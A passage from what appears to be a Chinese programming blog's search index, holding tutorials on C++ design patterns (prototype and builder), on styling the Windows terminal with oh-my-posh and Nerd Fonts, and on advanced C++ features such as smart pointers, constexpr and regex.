31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72  #include \u0026lt;iostream\u0026gt;#include \u0026lt;cstring\u0026gt;// 基类，需要将Clone方法定义为虚方法 class Shape { public: Shape(int centerX, int centerY, char *_color) : centerX(centerX), centerY(centerY), color(_color) { } virtual Shape *Clone() const = 0; virtual void getAddr() const = 0; virtual ~Shape() { } protected: int centerX, centerY; char *color; }; class Circle : public Shape { public: Circle(int centerX, int centerY, char *_color, int radius) : Shape(centerX, centerY, _color), radius(radius) { std::cout \u0026lt;\u0026lt; \u0026#34;Circle:(\u0026#34; \u0026lt;\u0026lt; centerX \u0026lt;\u0026lt; \u0026#39;,\u0026#39; \u0026lt;\u0026lt; centerY \u0026lt;\u0026lt; \u0026#34;),\u0026#34; \u0026lt;\u0026lt; radius \u0026lt;\u0026lt; \u0026#39;,\u0026#39; \u0026lt;\u0026lt; _color \u0026lt;\u0026lt; std::endl; } // clone的基本操作  Shape *Clone() const override { return new Circle(*this); } void getAddr() const override { std::cout \u0026lt;\u0026lt; \u0026amp;centerX \u0026lt;\u0026lt; \u0026#39; \u0026#39; \u0026lt;\u0026lt; \u0026amp;centerY \u0026lt;\u0026lt; \u0026#39; \u0026#39; \u0026lt;\u0026lt; \u0026amp;radius \u0026lt;\u0026lt; \u0026#39; \u0026#39; \u0026lt;\u0026lt; \u0026amp;color \u0026lt;\u0026lt; std::endl; } private: int radius; }; class Square : public Shape { Square(int centerX, int centerY, char *_color, int x) : Shape(centerX, centerY, _color), x(x) { std::cout \u0026lt;\u0026lt; \u0026#34;Square:(\u0026#34; \u0026lt;\u0026lt; centerX \u0026lt;\u0026lt; \u0026#39;,\u0026#39; \u0026lt;\u0026lt; centerY \u0026lt;\u0026lt; \u0026#34;),\u0026#34; \u0026lt;\u0026lt; x \u0026lt;\u0026lt; \u0026#39;,\u0026#39; \u0026lt;\u0026lt; _color \u0026lt;\u0026lt; std::endl; } Shape *Clone() const override { return new Square(*this); } void getAddr() const override { std::cout \u0026lt;\u0026lt; \u0026amp;centerX \u0026lt;\u0026lt; \u0026#39; \u0026#39; \u0026lt;\u0026lt; \u0026amp;centerY \u0026lt;\u0026lt; \u0026#39; \u0026#39; \u0026lt;\u0026lt; \u0026amp;x \u0026lt;\u0026lt; \u0026#39; \u0026#39; \u0026lt;\u0026lt; \u0026amp;color \u0026lt;\u0026lt; std::endl; } private: int x; }; int main() { Shape *shape1 = new Circle(2, 2, \u0026#34;red\u0026#34;, 3); Shape *shape2 = shape1-\u0026gt;Clone(); // 可以看到，调用clone方法可以避免浅拷贝的问题  shape1-\u0026gt;getAddr(); shape2-\u0026gt;getAddr(); delete shape1; delete shape2; }    结果：\nCircle:(2,2),3,red 0xd714d8 0xd714dc 0xd714e8 0xd714e0 0xd71528 0xd7152c 0xd71538 0xd71530\n 5.建造者模式 定义 将一个复杂对象的构建与它的表示分离，使得同样的构建过程可以创建不同的表示。\n有4种成员：抽象生成器（实现构造方法和装配方法的抽象接口）、具体生成器（实现各个部件的具体构造方法和装配方法）、产品、主管（隔离客户与对象的生产过程，并负责控制产品对象的生产过程）。\n以下以“烹饪两种不同菜品的厨师”为例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126  #include \u0026lt;iostream\u0026gt;#include \u0026lt;utility\u0026gt;#include \u0026lt;string\u0026gt;typedef std::pair\u0026lt;std::string,int\u0026gt; formula; // 菜谱  // 产品类(此处为饭菜) class Dish { public: // 在建造者模式中，不需要传统的构造函数形式  Dish(){} void setMeat(formula meat) { this-\u0026gt;meat = meat; } void setVegetable(formula vegetable) { this-\u0026gt;vegetable = vegetable; } void getInfo() { std::cout \u0026lt;\u0026lt; meat.first \u0026lt;\u0026lt; \u0026#39;:\u0026#39; \u0026lt;\u0026lt; meat.second \u0026lt;\u0026lt; \u0026#39;g\u0026#39; \u0026lt;\u0026lt; std::endl; std::cout \u0026lt;\u0026lt; vegetable.first \u0026lt;\u0026lt; \u0026#39;:\u0026#39; \u0026lt;\u0026lt; vegetable.second \u0026lt;\u0026lt; \u0026#39;g\u0026#39; \u0026lt;\u0026lt; std::endl; } private: formula meat; formula vegetable; }; // 抽象建造者类 class AbstractBuilder { public: AbstractBuilder() { this-\u0026gt;dish = new Dish(); } virtual void putMeat() = 0; virtual void putVegetable() = 0; virtual Dish* getDish() = 0; virtual ~AbstractBuilder(){} protected: Dish *dish; }; // 具体建造者类1(菜谱1) class ConcreteBuilderA :public AbstractBuilder { public: void putMeat () override { this-\u0026gt;dish-\u0026gt;setMeat(std::make_pair(\u0026#34;pork\u0026#34;,50)); } void putVegetable () override { this-\u0026gt;dish-\u0026gt;setVegetable(std::make_pair(\u0026#34;onion\u0026#34;,100)); } Dish* getDish() override { return this-\u0026gt;dish; } }; // 具体建造者类2(菜谱2) class ConcreteBuilderB :public AbstractBuilder { public: void putMeat () override { this-\u0026gt;dish-\u0026gt;setMeat(std::make_pair(\u0026#34;beef\u0026#34;,100)); } void putVegetable () override { this-\u0026gt;dish-\u0026gt;setVegetable(std::make_pair(\u0026#34;potato\u0026#34;,200)); } Dish* getDish() override { return this-\u0026gt;dish; } }; // 主管类，负责封装建造流程，返回建造结果 class Director { public: Director(){} void setBuilder(AbstractBuilder *_Builder) { this-\u0026gt;builder = _Builder; } // 核心封装代码  Dish* constructor() { this-\u0026gt;builder-\u0026gt;putMeat(); this-\u0026gt;builder-\u0026gt;putVegetable(); return this-\u0026gt;builder-\u0026gt;getDish(); } private: AbstractBuilder *builder; }; int main() { AbstractBuilder *builder; Director *director = new Director(); Dish *dish; // 指定建造器A  std::cout\u0026lt;\u0026lt;\u0026#34;dish1:\u0026#34;\u0026lt;\u0026lt;std::endl; builder = new ConcreteBuilderA(); director-\u0026gt;setBuilder(builder); dish = director-\u0026gt;constructor(); dish-\u0026gt;getInfo(); // 指定建造器B  std::cout\u0026lt;\u0026lt;\u0026#34;dish2:\u0026#34;\u0026lt;\u0026lt;std::endl; builder = new ConcreteBuilderB(); director-\u0026gt;setBuilder(builder); dish = director-\u0026gt;constructor(); dish-\u0026gt;getInfo(); delete builder; delete director; delete dish; }    结果：\ndish1: pork:50g onion:100g dish2: beef:100g potato:200g\n ","date":"2021-08-28T00:00:00Z","permalink":"https://ther-nullptr.github.io/posts/programming/design-pattern-0/","title":"设计模式（一）"},{"content":"计算机美化指南 前言 一个美观的开发界面，对于调试程序、管理代码版本、提升编程体验等有着至关重要的作用。本文介绍了windows平台下命令行界面的美化方法，以期让读者拥有更好的编程体验。\n在图形化用户界面（GUI）大规模普及之前，命令行界面（CLI）一直是电脑界的主流。CLI开销小、运行快速，但是非专业用户使用不方便。如今，不从事开发的电脑用户接触到命令行的机会已经很少了（非计算机系学习C，可能只会在“命令行参数”一节接触到命令行），但如果从事软件开发，使用git、gcc等工具，熟练掌握命令行的使用还是有必要的。\ncmd 点击win+R，输入cmd，就会弹出windows下最基本的命令行终端——cmd。它的初始界面长这样：\n且不说白+黑的配色毫无生机，字体看上去也十分违和。这种不美观的界面可能的确劝退了不少人学习它的欲望。\n 科普：什么样的字体才能称之为好看？\n  serif：衬线字体，字体边缘具有明显的艺术修饰效果，如 宋体（simsun）、Times new roman。\n这种字体适合做艺术字，但若用作代码字体，则会显得节外生枝，影响呈现效果。\n  sans-serif：非衬线字体，字体比划一般粗细均匀、清晰，如 微软雅黑（Arial）。这种字体一般用于正文写作。\n  monospace：等宽字体，指每个英文字符（字母、数字、标点）宽度一致的字体。如 Consolas、Courier New。\n这种字体由于呈现效果较好，被广泛地用于编程。\n绝大多数开发工具都会有使用等宽字体的建议（如VS 2019）：\n   我们试图给cmd换一个monospace的字体（右键边框，点击“属性”）。遗憾的是，cmd字体的选择十分匮乏，找不到合适的monospace字体。\npowershell 我们看看windows上另一款更加强大的命令行界面：powershell。在windows搜索框中键入powershell，打开。\n遗憾的是，除了黑色界面变成蓝色界面，字体的呈现效果并没有什么改观。而且，powershell也没有提供一种较为美观的monospace字体。\nwindows terminal 长期以来，windows都没有像mac、Linux那样，为开发者提供一个较为美观的命令行界面。这种情况一直到2019年windows terminal的推出才有所改观。你可以在Microsoft Store中直接安装它。\n安装完毕后，启动效果如下：\n打开“设置-power shell图标-外观”，可以看到现在终端的字体是Cascadia Mono，可以查证这是一种等宽字体。windows powershell的字体的选择十分丰富，你可以根据自己的喜好任意挑选。\noh-my-posh 还可以实现更加美观的效果吗？当然可以！我们需要借助oh-my-posh插件，先看下最终效果吧:\n可以看到，该插件不仅加入了彩色的图标、操作时间等元素，而且对文件夹的git仓库状态等也有较好的显示。\n预安装要求：Windows terminal、git（后台回复：git，领取git安装程序，安装时只需一路点OK）。\n  下载oh-my-posh和posh-git插件\n由于一些众所周知的原因，网络上所展示的传统的下载途径可能需要一些特殊的手段。对此，小编准备了插件资源（后台回复：terminal，提取插件）。资源中有一个Modules文件夹和一个Microsoft.PowerShell_profile.ps1文件。\n下载完毕后，在你的电脑中找到C:\\Users\\用户名\\Documents(或文档)\\WindowsPowerShell文件夹（也有可能是其它的D盘或E盘，因人而异）。此时的文件夹中应该有一个Scripts文件夹。将Modules文件夹和一个Microsoft.PowerShell_profile.ps1文件按照如下方式放置：\n启动windows terminal，会看到以下场景：\n这些方块是什么？是乱码。这是因为系统自带的字体不能渲染oh-my-posh的一些特定符号。我们需要下载对应的字体。\n  终端后续配置\n为渲染这些符号，我们需要下载名为Nerd系列的字体。网址如下：https://www.nerdfonts.com/\n（若网址打不开，也可后台回复：fonts，领取Nerd字体）。解压文件夹后，打开其中的.ttf文件，点击安装，即可使用字体。\n重启windows terminal，选择刚才安装的字体，即可呈现出正确的效果。\n还可以设置终端背景、终端透明度等，让你的命令行界面更加出彩。\n至此，命令行界面美化完成！\n  ","date":"2021-08-19T23:53:42+08:00","permalink":"https://ther-nullptr.github.io/posts/awesome_toolkits/oh-my-posh/","title":"Oh My Posh"},{"content":"std::function 把对象当作函数使用。\n好处：运算符的参数个数不变，但通过数据成员可以使得函数功能“模板化”\n一个std::function类型对象实例可以包装下列这几种可调用元素类型：函数、函数指针、类成员函数指针或任意类型的函数对象（例如定义了operator()操作并拥有函数闭包）\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40  #include \u0026lt;string\u0026gt;#include \u0026lt;iostream\u0026gt;#include \u0026lt;vector\u0026gt;#include \u0026lt;algorithm\u0026gt;using namespace std; class Time { public: unsigned int Hour; unsigned int Minute; unsigned int Second; }; class DisplayTime { public: DisplayTime(unsigned int Min = 0, unsigned int Max = 24) : m_Min(Min), m_Max(Max) {} void operator()(const Time \u0026amp;t1) { if (t1.Hour \u0026gt;= m_Min \u0026amp;\u0026amp; t1.Hour \u0026lt;= m_Max) { cout \u0026lt;\u0026lt; t1.Hour \u0026lt;\u0026lt; \u0026#34;:\u0026#34; \u0026lt;\u0026lt; t1.Minute \u0026lt;\u0026lt; \u0026#34;:\u0026#34; \u0026lt;\u0026lt; t1.Second \u0026lt;\u0026lt; endl; } } private: unsigned int m_Min; unsigned int m_Max; }; int main() { vector\u0026lt;Time\u0026gt; V{{1, 2, 3}, {2, 5, 6}, {1, 9, 0}}; for_each(V.begin(),V.end(),DisplayTime()); // 更加优雅的写法  // DisplayTime Display;  // for_each(V.begin(),V.end(),Display); }   更多用法参考：https://en.cppreference.com/w/cpp/utility/functional/function\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  #include \u0026lt;iostream\u0026gt;#include \u0026lt;functional\u0026gt;using namespace std; int g_Minus(int i, int j) { return i - j; } int main() { function\u0026lt;int(int, int)\u0026gt; f = g_Minus; cout \u0026lt;\u0026lt; f(1, 2) \u0026lt;\u0026lt; endl; // -1  return 1; }   std::bind https://thispointer.com/stdbind-tutorial-and-usage-details/\nbind是这样一种机制，它可以预先把指定可调用实体的某些参数绑定到已有的变量，产生一个新的可调用实体。与std::function的区别，可由以下代码意会：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31  #include\u0026lt;functional\u0026gt;#include\u0026lt;iostream\u0026gt; using std::placeholders; double cal(double a,double b,char op) { switch(op) { case \u0026#39;+\u0026#39;: return a+b; case \u0026#39;-\u0026#39;: return a-b; default: return 0; } } int main() { // 通过占位符，设置函数的不同固定参数，在传参时更加层次分明，可读性更强 \tauto plus_with_bind = std::bind(cal, _1, _2, \u0026#39;+\u0026#39;); std::cout \u0026lt;\u0026lt; plus_with_bind(1,2); std::function\u0026lt;double(double , double , char)\u0026gt; plus_with_func = cal; // 可见传参时与std::bind的区别  std::cout \u0026lt;\u0026lt; plus_with_func(1,2,\u0026#39;+\u0026#39;); }   tuple C++ 17为元组的使用提供了极大的方便。\n1 2 3 4 5 6 7 8 9 10 11 12  #include \u0026lt;iostream\u0026gt;#include \u0026lt;tuple\u0026gt;std::tuple\u0026lt;int, double, std::string\u0026gt; f() { return std::make_tuple(1, 2.3, \u0026#34;456\u0026#34;); } int main() { auto [x, y, z] = f(); std::cout \u0026lt;\u0026lt; x \u0026lt;\u0026lt; \u0026#34;, \u0026#34; \u0026lt;\u0026lt; y \u0026lt;\u0026lt; \u0026#34;, \u0026#34; \u0026lt;\u0026lt; z \u0026lt;\u0026lt; std::endl; return 0; }   变长参数 C++ 17中的折叠表达式\n1 2 3 4 5 6 7 8 9 10  #include \u0026lt;iostream\u0026gt;template \u0026lt;typename... T\u0026gt; auto sum(T... t) { return (t + ...); } int main() { std::cout \u0026lt;\u0026lt; sum(1, 2, 3, 4, 5, 6, 7, 8, 9, 10) \u0026lt;\u0026lt; std::endl; }   C++ 17中的变参模板展开\n1 2 3 4 5 6 7 8 9 10 11 12 13 14  #include \u0026lt;iostream\u0026gt;template \u0026lt;typename T0,typename... T\u0026gt; auto print(T0 t0,T... t) { std::cout \u0026lt;\u0026lt; t0 \u0026lt;\u0026lt; std::endl; if constexpr (sizeof...(t) \u0026gt; 0) { print(t...); } } int main() { print(\u0026#34;1\u0026#34;,2,\u0026#39;3\u0026#39;); }   避免了以前递归函数的繁琐写法\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  template\u0026lt;typename T\u0026gt;//0个参数 void show_list(){} template\u0026lt;typename T\u0026gt;//1个参数 void show_list(const T\u0026amp; value) { std::cout\u0026lt;\u0026lt;value\u0026lt;\u0026lt;std::endl; } template\u0026lt;typename T,typename... Args\u0026gt;//2个参数以上 void show_list(const T\u0026amp; value,const Args\u0026amp;... args) { std::cout\u0026lt;\u0026lt;value\u0026lt;\u0026lt;std::endl; show_list(args...); }   强转 dynamic_cast\n多用于多态的转换。\n用法：\n dynamic_cast\u0026lt;type*\u0026gt;(e) //e是指针\ndynamic_cast\u0026lt;type\u0026amp;\u0026gt;(e) //e是左值\ndynamic_cast\u0026lt;type\u0026amp;\u0026amp;\u0026gt;(e)//e是右值\n static_cast\n多用于基本类型转换。\n1  int a = static_cast\u0026lt;int\u0026gt;(120.34);   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42  /** * @file rtti.cpp * @brief 在面向对象程序设计中，有时我们需要在运行时查询一个对象是否能作为某种多态类型使用。与Java的instanceof，以及C#的as、is运算符类似，C++提供了dynamic_cast函数用于动态转型。相比C风格的强制类型转换和C++ reinterpret_cast，dynamic_cast提供了类型安全检查，是一种基于能力查询(Capability Query)的转换，所以在多态类型间进行转换更提倡采用dynamic_cast * @author 光城 * @version v1 * @date 2019-07-24 */ // CPP program to illustrate // // Run Time Type Identification #include \u0026lt;iostream\u0026gt;#include \u0026lt;typeinfo\u0026gt;class B { public: virtual void fun() { std::cout \u0026lt;\u0026lt; \u0026#34;B virtual\u0026#34; \u0026lt;\u0026lt; std::endl; } }; class D : public B { public: virtual void fun() final { std::cout \u0026lt;\u0026lt; \u0026#34;D virtual\u0026#34; \u0026lt;\u0026lt; std::endl; } void foo() { std::cout \u0026lt;\u0026lt; \u0026#34;D\u0026#34; \u0026lt;\u0026lt; std::endl; } }; int main() { B *b = new D; // 向上转型  b-\u0026gt;fun(); D *d = dynamic_cast\u0026lt;D *\u0026gt;(b); // 向下转型  d-\u0026gt;fun(); d-\u0026gt;foo(); }   extern \u0026ldquo;C\u0026rdquo; cpp调用c\n1 2 3 4 5 6 7 8 9 10 11 12  //xx.h extern int add(...) //xx.c int add(){ } //xx.cpp extern \u0026#34;C\u0026#34; { #include \u0026#34;xx.h\u0026#34;}   c调用cpp\n1 2 3 4 5 6 7 8 9 10  //xx.h extern \u0026#34;C\u0026#34;{ int add(); } //xx.cpp int add(){ } //xx.c extern int add();   以下一段代码展示了如何协调c和cpp的兼容性\n1 2 3 4 5 6 7 8  #ifdef __cplusplus extern \u0026#34;C\u0026#34; { #endif  int add(int x, int y); #ifdef __cplusplus } #endif   __cplusplus 其实是一个长整数，其值与cpp标准有关\nenum class的新用法 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  #include \u0026lt;iostream\u0026gt;enum class Color3 : char; // 前向声明  // 定义 enum class Color3 : char { RED = \u0026#39;r\u0026#39;, BLUE = \u0026#39;b\u0026#39;, YELLOW = \u0026#39;y\u0026#39; }; int main() { char c = static_cast\u0026lt;char\u0026gt;(Color3::RED); std::cout\u0026lt;\u0026lt;c\u0026lt;\u0026lt;std::endl; }   constexpr constexpr 说明符声明可以在编译时求得函数或变量的值。然后这些变量和函数（若给定了合适的函数实参）即可用于仅允许编译时常量表达式之处。\nconst和constexpr具体有什么区别？见以下代码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20  #include \u0026lt;iostream\u0026gt;#include \u0026lt;array\u0026gt;using namespace std; void dis_1(const int x) { //错误，x是只读的变量  array\u0026lt;int, x\u0026gt; myarr{1, 2, 3, 4, 5}; cout \u0026lt;\u0026lt; myarr[1] \u0026lt;\u0026lt; endl; } void dis_2() { const int x = 5; array\u0026lt;int, x\u0026gt; myarr{1, 2, 3, 4, 5}; cout \u0026lt;\u0026lt; myarr[1] \u0026lt;\u0026lt; endl; } int main() { dis_1(5); dis_2(); }   原因在于，在dis_1()中，const int x只强调x是一个只可读的量（在该段函数内部不会被改变），在编译阶段x的值无法确定。严格地说，这里的x不能称之为常量。\nC++ 11标准中，为了解决 const 关键字的双重语义问题，保留了 const 表示“只读”的语义，而将“常量”的语义划分给了新添加的 constexpr 关键字。因此 C++11 标准中，建议将 const 和 constexpr 的功能区分开，即凡是表达“只读”语义的场景都使用 const，表达“常量”语义的场景都使用 constexpr。使用constexpr时，编译器会对代码做对应的优化。\n以下一段代码说明了两者的区别：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20  #include \u0026lt;iostream\u0026gt;#include \u0026lt;array\u0026gt;using namespace std; constexpr int sqr1(int arg) { return arg * arg; } const int sqr2(int arg) { return arg * arg; } int main() { array\u0026lt;int, sqr1(10)\u0026gt; mylist1; //可以，因为sqr1时constexpr函数  array\u0026lt;int, sqr2(10)\u0026gt; mylist1; //不可以，因为sqr2不是constexpr函数  return 0; }   C++ 14起，放松了对constexpr修饰函数的限制。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14  #include \u0026lt;iostream\u0026gt;constexpr int fibonacci(const int n) { if (n == 1) return 1; if (n == 2) return 1; return fibonacci(n - 1) + fibonacci(n - 2); } int main() { std::cout \u0026lt;\u0026lt; fibonacci(40) \u0026lt;\u0026lt; std::endl; }   在C++ 17中，if语句也可以用constexpr修饰。可以根据模板参数的值编译程序。\n1 2 3 4 5 6 7 8 9  #include \u0026lt;iostream\u0026gt;int main() { const int a = 1; if constexpr (a) { } }   智能指针 shared_ptr 此指针能够记录多少个shared_ptr共同指向一个对象，若为0则自动调用delete。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24  #include \u0026lt;iostream\u0026gt;#include \u0026lt;memory\u0026gt;void foo(std::shared_ptr\u0026lt;int\u0026gt; i) { (*i)++; } int main() { // Constructed a std::shared_ptr  std::shared_ptr\u0026lt;int\u0026gt; pointer = std::make_shared\u0026lt;int\u0026gt;(10); // 引用计数+1  auto pointer2 = pointer; // 查看引用计数  std::cout \u0026lt;\u0026lt; pointer.use_count()\u0026lt;\u0026lt; std::endl; // 获取原指针  int *p = pointer.get(); // 解除引用  pointer2.reset(); foo(pointer); std::cout \u0026lt;\u0026lt; *pointer \u0026lt;\u0026lt; std::endl; // 11  // The shared_ptr will be destructed before leaving the scope  return 0; }   unique_ptr unique_ptr能保证只有一个指针指向某对象。\n1 2  std::unique_ptr\u0026lt;int\u0026gt; pointer = std::make_unique\u0026lt;int\u0026gt;(10); // make_unique 从C++14 引入 std::unique_ptr\u0026lt;int\u0026gt; pointer2 = pointer; // 非法   weak_ptr 为解决循环引用导致的智能指针内存泄露，引入weak_ptr。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33  #include \u0026lt;iostream\u0026gt;#include \u0026lt;memory\u0026gt;using namespace std; class B; class A { public: A() { cout \u0026lt;\u0026lt; \u0026#34;A\u0026#39;s constructor ...\u0026#34; \u0026lt;\u0026lt; endl; } ~A() { cout \u0026lt;\u0026lt; \u0026#34;A\u0026#39;s destructor ...\u0026#34; \u0026lt;\u0026lt; endl; } std::weak_ptr\u0026lt;B\u0026gt; weak_b; }; class B { public: B() { cout \u0026lt;\u0026lt; \u0026#34;B\u0026#39;s constructor ...\u0026#34; \u0026lt;\u0026lt; endl; } ~B() { cout \u0026lt;\u0026lt; \u0026#34;B\u0026#39;s destructor ...\u0026#34; \u0026lt;\u0026lt; endl; } std::weak_ptr\u0026lt;A\u0026gt; weak_a; }; int main() { std::shared_ptr\u0026lt;A\u0026gt; aa = make_shared\u0026lt;A\u0026gt;(); //aa-\u0026gt;object A aa计数器 1  std::shared_ptr\u0026lt;B\u0026gt; bb = make_shared\u0026lt;B\u0026gt;(); //bb-\u0026gt;object B bb计数器 1  aa-\u0026gt;weak_b = bb; //计数器还是1哦  bb-\u0026gt;weak_a = aa; //计数器还是1哦  return 0; }   正则表达式 使用正则表达式匹配字符串。\n1 2 3 4 5 6 7 8 9 10 11  #include \u0026lt;iostream\u0026gt;#include \u0026lt;string\u0026gt;#include \u0026lt;regex\u0026gt;int main() { std::string fnames[] = {\u0026#34;foo.txt\u0026#34;, \u0026#34;bar.txt\u0026#34;, \u0026#34;test\u0026#34;, \u0026#34;a0.txt\u0026#34;, \u0026#34;AAA.txt\u0026#34;}; // 在C++ 中\\ 会被作为字符串内的转义符，为使\\. 作为正则表达式传递进去生效，需要对\\ 进行二次转义  std::regex txt_regex(\u0026#34;[a-z]+\\\\.txt\u0026#34;); for (const auto \u0026amp;fname : fnames) std::cout \u0026lt;\u0026lt; fname \u0026lt;\u0026lt; \u0026#34;: \u0026#34; \u0026lt;\u0026lt; std::regex_match(fname, txt_regex) \u0026lt;\u0026lt; std::endl; }   使用正则表达式搜索字串。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25  #include \u0026lt;iostream\u0026gt;#include \u0026lt;string\u0026gt;#include \u0026lt;regex\u0026gt;int main() { std::string fnames[] = {\u0026#34;foo.txt\u0026#34;, \u0026#34;bar.txt\u0026#34;, \u0026#34;test\u0026#34;, \u0026#34;a0.txt\u0026#34;, \u0026#34;AAA.txt\u0026#34;}; // 在C++ 中\\ 会被作为字符串内的转义符，为使\\. 作为正则表达式传递进去生效，需要对\\ 进行二次转义  std::regex base_regex(\u0026#34;([a-z]+)\\\\.txt\u0026#34;); std::smatch base_match; for (const auto \u0026amp;fname : fnames) { if (std::regex_match(fname, base_match, base_regex)) { // std::smatch 的第一个元素匹配整个字符串  // std::smatch 的第二个元素匹配了第一个括号表达式  // 以此类推，此处匹配的逻辑与python一样  if (base_match.size() == 2) { std::string base = base_match[1].str(); std::cout \u0026lt;\u0026lt; \u0026#34;sub-match[0]: \u0026#34; \u0026lt;\u0026lt; base_match[0].str() \u0026lt;\u0026lt; std::endl; std::cout \u0026lt;\u0026lt; fname \u0026lt;\u0026lt; \u0026#34; sub-match[1]: \u0026#34; \u0026lt;\u0026lt; base \u0026lt;\u0026lt; std::endl; } } } }   ","date":"2021-07-27T00:00:00Z","permalink":"https://ther-nullptr.github.io/posts/programming/cpp_advanced/","title":"C++ 高级用法选讲"}]